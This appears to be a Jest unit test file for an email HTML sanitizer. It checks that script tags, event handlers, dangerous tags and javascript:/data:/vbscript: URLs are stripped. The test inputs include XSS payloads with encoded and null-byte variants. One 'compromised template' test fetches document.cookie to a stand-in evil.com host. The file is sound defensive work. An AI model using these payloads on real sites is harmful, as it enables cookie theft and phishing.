/**
 * Unit Tests - HTML Sanitization Utility
 *
 * Tests XSS prevention and HTML sanitization functionality
 */

import {
  sanitizeEmailHtml,
  isHtmlSafe,
  getDangerousPatterns,
} from '../html-sanitization.util';

describe('HTML Sanitization Utility', () => {
  describe('sanitizeEmailHtml', () => {
    describe('XSS Prevention - Script Tags', () => {
      it('should remove <script> tags', () => {
        const input = '<p>Hello</p><script>alert("xss")</script>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<script>');
        expect(output).not.toContain('alert');
        expect(output).toContain('<p>Hello</p>');
      });

      it('should remove <script> tags with attributes', () => {
        const input = '<script type="text/javascript" src="evil.js"></script>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<script');
        expect(output).not.toContain('evil.js');
      });

      it('should remove inline script in various cases', () => {
        const cases = [
          '<SCRIPT>alert("xss")</SCRIPT>',
          '<script >alert("xss")</script>',
          '<script\n>alert("xss")</script>',
          '<ScRiPt>alert("xss")</ScRiPt>',
        ];

        cases.forEach((testCase) => {
          const output = sanitizeEmailHtml(testCase);
          expect(output).not.toContain('alert');
          expect(output).not.toContain('<script');
          expect(output).not.toContain('<SCRIPT');
        });
      });
    });

    describe('XSS Prevention - Event Handlers', () => {
      it('should remove onclick handlers', () => {
        const input = '<button onclick="alert(\'xss\')">Click me</button>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('onclick');
        expect(output).not.toContain('alert');
      });

      it('should remove onerror handlers from images', () => {
        const input = '<img src="x" onerror="alert(\'xss\')" />';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('onerror');
        expect(output).not.toContain('alert');
        expect(output).toContain('<img');
        expect(output).toContain('src="x"');
      });

      it('should remove various event handlers', () => {
        const handlers = [
          'onload',
          'onmouseover',
          'onmouseout',
          'onfocus',
          'onblur',
          'onchange',
          'onsubmit',
        ];

        handlers.forEach((handler) => {
          const input = `<div ${handler}="alert('xss')">Content</div>`;
          const output = sanitizeEmailHtml(input);

          expect(output).not.toContain(handler);
          expect(output).not.toContain('alert');
        });
      });
    });

    describe('XSS Prevention - Dangerous Tags', () => {
      it('should remove <iframe> tags', () => {
        const input = '<iframe src="https://evil.com"></iframe>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<iframe');
        expect(output).not.toContain('evil.com');
      });

      it('should remove <object> tags', () => {
        const input = '<object data="malware.swf"></object>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<object');
        expect(output).not.toContain('malware');
      });

      it('should remove <embed> tags', () => {
        const input = '<embed src="evil.swf">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<embed');
        expect(output).not.toContain('evil');
      });

      it('should remove <link> tags', () => {
        const input = '<link rel="stylesheet" href="evil.css">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<link');
        expect(output).not.toContain('evil.css');
      });

      it('should remove <style> tags', () => {
        const input = '<style>body { background: url("javascript:alert(1)") }</style>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<style');
        expect(output).not.toContain('background');
      });

      it('should remove <form> tags', () => {
        const input = '<form action="https://evil.com"><input name="password"></form>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<form');
        expect(output).not.toContain('<input');
        expect(output).not.toContain('evil.com');
      });

      it('should remove <base> tags', () => {
        const input = '<base href="https://evil.com/">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<base');
      });

      it('should remove <meta> tags', () => {
        const input = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<meta');
      });
    });

    describe('XSS Prevention - Dangerous URL Schemes', () => {
      it('should remove javascript: URLs from links', () => {
        const input = '<a href="javascript:alert(\'xss\')">Click</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('javascript:');
        expect(output).not.toContain('alert');
      });

      it('should remove data: URLs from images', () => {
        const input = '<img src="data:text/html,<script>alert(1)</script>">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('data:');
      });

      it('should remove vbscript: URLs', () => {
        const input = '<a href="vbscript:msgbox(\'xss\')">Click</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('vbscript:');
      });

      it('should allow http and https URLs', () => {
        const input = '<a href="https://example.com">Safe Link</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('https://example.com');
        expect(output).toContain('Safe Link');
      });

      it('should allow mailto: URLs', () => {
        const input = '<a href="mailto:test@example.com">Email me</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('mailto:test@example.com');
        expect(output).toContain('Email me');
      });
    });

    describe('Safe HTML Preservation', () => {
      it('should preserve allowed text formatting tags', () => {
        const input = '<p>Text with <strong>bold</strong> and <em>italic</em></p>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<p>');
        expect(output).toContain('<strong>bold</strong>');
        expect(output).toContain('<em>italic</em>');
      });

      it('should preserve headings', () => {
        const input = '<h1>Title</h1><h2>Subtitle</h2><h3>Section</h3>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<h1>Title</h1>');
        expect(output).toContain('<h2>Subtitle</h2>');
        expect(output).toContain('<h3>Section</h3>');
      });

      it('should preserve lists', () => {
        const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<ul>');
        expect(output).toContain('<li>Item 1</li>');
        expect(output).toContain('<li>Item 2</li>');
        expect(output).toContain('</ul>');
      });

      it('should preserve tables', () => {
        const input = `
          <table>
            <thead><tr><th>Header</th></tr></thead>
            <tbody><tr><td>Data</td></tr></tbody>
          </table>
        `;
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<table>');
        expect(output).toContain('<thead>');
        expect(output).toContain('<th>Header</th>');
        expect(output).toContain('<tbody>');
        expect(output).toContain('<td>Data</td>');
      });

      it('should preserve images with safe attributes', () => {
        const input = '<img src="https://example.com/image.png" alt="Test" width="100" height="100">';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<img');
        expect(output).toContain('src="https://example.com/image.png"');
        expect(output).toContain('alt="Test"');
        expect(output).toContain('width="100"');
        expect(output).toContain('height="100"');
      });

      it('should preserve blockquotes and code', () => {
        const input = '<blockquote>Quote</blockquote><pre><code>const x = 1;</code></pre>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<blockquote>Quote</blockquote>');
        expect(output).toContain('<pre>');
        expect(output).toContain('<code>const x = 1;</code>');
      });

      it('should preserve semantic HTML5 tags', () => {
        const input = '<article><header>Header</header><section>Content</section><footer>Footer</footer></article>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<article>');
        expect(output).toContain('<header>Header</header>');
        expect(output).toContain('<section>Content</section>');
        expect(output).toContain('<footer>Footer</footer>');
      });
    });

    describe('Link Security', () => {
      it('should add target="_blank" to all links', () => {
        const input = '<a href="https://example.com">Link</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('target="_blank"');
      });

      it('should add rel="noopener noreferrer" to all links', () => {
        const input = '<a href="https://example.com">Link</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('rel="noopener noreferrer"');
      });

      it('should override existing target attribute', () => {
        const input = '<a href="https://example.com" target="_self">Link</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('target="_blank"');
        expect(output).not.toContain('target="_self"');
      });
    });

    describe('CSS/Style Validation', () => {
      it('should allow safe inline styles', () => {
        const input = '<p style="color: #FF0000; font-size: 16px;">Red text</p>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('style=');
        expect(output).toContain('color');
        expect(output).toContain('font-size');
      });

      it('should remove dangerous CSS expressions', () => {
        const input = '<div style="background: expression(alert(\'xss\'))">Text</div>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('expression');
        expect(output).not.toContain('alert');
      });

      it('should validate color values', () => {
        const validColors = '<p style="color: #FF0000">Red</p><p style="color: rgb(255, 0, 0)">Also Red</p>';
        const output = sanitizeEmailHtml(validColors);

        expect(output).toContain('color:');
      });
    });

    describe('Edge Cases', () => {
      it('should return empty string for null input', () => {
        const output = sanitizeEmailHtml(null as any);
        expect(output).toBe('');
      });

      it('should return empty string for undefined input', () => {
        const output = sanitizeEmailHtml(undefined as any);
        expect(output).toBe('');
      });

      it('should return empty string for empty string', () => {
        const output = sanitizeEmailHtml('');
        expect(output).toBe('');
      });

      it('should return empty string for non-string input', () => {
        const output = sanitizeEmailHtml(123 as any);
        expect(output).toBe('');
      });

      it('should handle malformed HTML', () => {
        const input = '<p>Unclosed paragraph<div>Nested</p></div>';
        const output = sanitizeEmailHtml(input);

        // Should not throw error
        expect(output).toBeTruthy();
      });

      it('should handle deeply nested HTML', () => {
        const input = '<div><div><div><div><div><p>Deep</p></div></div></div></div></div>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<p>Deep</p>');
      });

      it('should handle HTML entities', () => {
        const input = '<p>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</p>';
        const output = sanitizeEmailHtml(input);

        expect(output).toContain('<p>');
        // Entities should be preserved
        expect(output).toContain('&lt;');
      });

      it('should handle very long HTML content', () => {
        const longContent = '<p>' + 'A'.repeat(10000) + '</p>';
        const output = sanitizeEmailHtml(longContent);

        expect(output).toContain('<p>');
        expect(output.length).toBeGreaterThan(1000);
      });
    });

    describe('Complex XSS Attempts', () => {
      it('should handle encoded javascript: URLs', () => {
        const input = '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('alert');
      });

      it('should handle mixed case and whitespace in tags', () => {
        const input = '<   ScRiPt   >alert("xss")</  ScRiPt  >';
        const output = sanitizeEmailHtml(input);

        // Malformed tags are escaped, which is safe
        expect(output).toContain('&lt;');
        expect(output).toContain('&gt;');
        // The escaped content is safe to display
        expect(output).not.toContain('<script');
      });

      it('should handle attribute injection attempts', () => {
        const input = '<img src="x" a="<script>alert(1)</script>">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('<script>');
        expect(output).not.toContain('alert');
      });

      it('should handle null byte injection', () => {
        const input = '<img src="javascript\0:alert(1)">';
        const output = sanitizeEmailHtml(input);

        expect(output).not.toContain('alert');
      });
    });
  });

  describe('isHtmlSafe', () => {
    it('should return true for safe HTML', () => {
      const safeHtml = '<p>Hello <strong>world</strong></p>';
      expect(isHtmlSafe(safeHtml)).toBe(true);
    });

    it('should return false for HTML with script tags', () => {
      const unsafeHtml = '<p>Hello</p><script>alert("xss")</script>';
      expect(isHtmlSafe(unsafeHtml)).toBe(false);
    });

    it('should return false for HTML with event handlers', () => {
      const unsafeHtml = '<div onclick="alert(1)">Click</div>';
      expect(isHtmlSafe(unsafeHtml)).toBe(false);
    });

    it('should return false for HTML with dangerous URLs', () => {
      const unsafeHtml = '<a href="javascript:alert(1)">Click</a>';
      expect(isHtmlSafe(unsafeHtml)).toBe(false);
    });

    it('should return true for empty string', () => {
      expect(isHtmlSafe('')).toBe(true);
    });

    it('should return true for null', () => {
      expect(isHtmlSafe(null as any)).toBe(true);
    });

    it('should normalize whitespace when comparing', () => {
      const html = '<p>  Hello   world  </p>';
      // Whitespace normalization may affect comparison
      expect(typeof isHtmlSafe(html)).toBe('boolean');
    });
  });

  describe('getDangerousPatterns', () => {
    it('should detect script tags', () => {
      const html = '<script>alert("xss")</script>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('<script> tag');
    });

    it('should detect iframe tags', () => {
      const html = '<iframe src="evil.com"></iframe>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('<iframe> tag');
    });

    it('should detect event handlers', () => {
      const html = '<div onclick="alert(1)">Click</div>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('onclick event handler');
    });

    it('should detect javascript: URLs', () => {
      const html = '<a href="javascript:alert(1)">Click</a>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('javascript: URL scheme');
    });

    it('should detect data: URLs', () => {
      const html = '<img src="data:text/html,<script>alert(1)</script>">';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('data: URL scheme');
    });

    it('should detect vbscript: URLs', () => {
      const html = '<a href="vbscript:msgbox(1)">Click</a>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('vbscript: URL scheme');
    });

    it('should detect multiple dangerous patterns', () => {
      const html = `
        <script>alert(1)</script>
        <iframe src="evil.com"></iframe>
        <div onclick="alert(2)">Click</div>
        <a href="javascript:alert(3)">Link</a>
      `;
      const patterns = getDangerousPatterns(html);

      expect(patterns.length).toBeGreaterThanOrEqual(4);
      expect(patterns).toContain('<script> tag');
      expect(patterns).toContain('<iframe> tag');
      expect(patterns).toContain('onclick event handler');
      expect(patterns).toContain('javascript: URL scheme');
    });

    it('should return empty array for safe HTML', () => {
      const html = '<p>Hello <strong>world</strong></p>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toEqual([]);
    });

    it('should return empty array for empty input', () => {
      expect(getDangerousPatterns('')).toEqual([]);
      expect(getDangerousPatterns(null as any)).toEqual([]);
    });

    it('should detect form tags', () => {
      const html = '<form action="evil.com"><input name="password"></form>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('<form> tag');
      expect(patterns).toContain('<input> tag');
    });

    it('should detect style tags', () => {
      const html = '<style>body { background: red; }</style>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('<style> tag');
    });

    it('should detect link tags', () => {
      const html = '<link rel="stylesheet" href="evil.css">';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('<link> tag');
    });

    it('should be case-insensitive for tags', () => {
      const html = '<SCRIPT>alert(1)</SCRIPT>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('<script> tag');
    });

    it('should be case-insensitive for event handlers', () => {
      const html = '<div ONCLICK="alert(1)">Click</div>';
      const patterns = getDangerousPatterns(html);

      expect(patterns).toContain('onclick event handler');
    });
  });

  describe('Real-world Email Templates', () => {
    it('should safely handle a typical marketing email', () => {
      const template = `
        <html>
          <body>
            <h1>Welcome to Our Service!</h1>
            <p>Thank you for signing up.</p>
            <a href="https://example.com/verify">Verify your email</a>
            <img src="https://example.com/logo.png" alt="Logo" width="200">
            <footer>
              <p style="color: #666; font-size: 12px;">Unsubscribe</p>
            </footer>
          </body>
        </html>
      `;

      const output = sanitizeEmailHtml(template);

      expect(output).toContain('<h1>Welcome to Our Service!</h1>');
      expect(output).toContain('<p>Thank you for signing up.</p>');
      expect(output).toContain('https://example.com/verify');
      expect(output).toContain('target="_blank"');
      expect(output).toContain('<img');
      expect(output).toContain('<footer>');
    });

    it('should sanitize a compromised email template', () => {
      const compromisedTemplate = `
        <h1>Important Notice</h1>
        <p>Your account needs verification.</p>
        <script>
          // Malicious code
          fetch('https://evil.com/steal?data=' + document.cookie);
        </script>
        <a href="javascript:void(fetch('https://evil.com/phish'))">Click here</a>
        <img src="x" onerror="alert('xss')">
      `;

      const output = sanitizeEmailHtml(compromisedTemplate);

      expect(output).toContain('<h1>Important Notice</h1>');
      expect(output).toContain('<p>Your account needs verification.</p>');
      expect(output).not.toContain('<script>');
      expect(output).not.toContain('fetch');
      expect(output).not.toContain('javascript:');
      expect(output).not.toContain('onerror');
      expect(output).not.toContain('alert');
    });

    it('should handle email with table-based layout', () => {
      const tableEmail = `
        <table width="600" cellpadding="0" cellspacing="0">
          <tr>
            <td>
              <h2>Invoice #12345</h2>
              <table border="1">
                <thead>
                  <tr>
                    <th>Item</th>
                    <th>Price</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Product A</td>
                    <td>$100</td>
                  </tr>
                </tbody>
              </table>
            </td>
          </tr>
        </table>
      `;

      const output = sanitizeEmailHtml(tableEmail);

      expect(output).toContain('<table');
      expect(output).toContain('<thead>');
      expect(output).toContain('<th>Item</th>');
      expect(output).toContain('<td>Product A</td>');
    });
  });
});
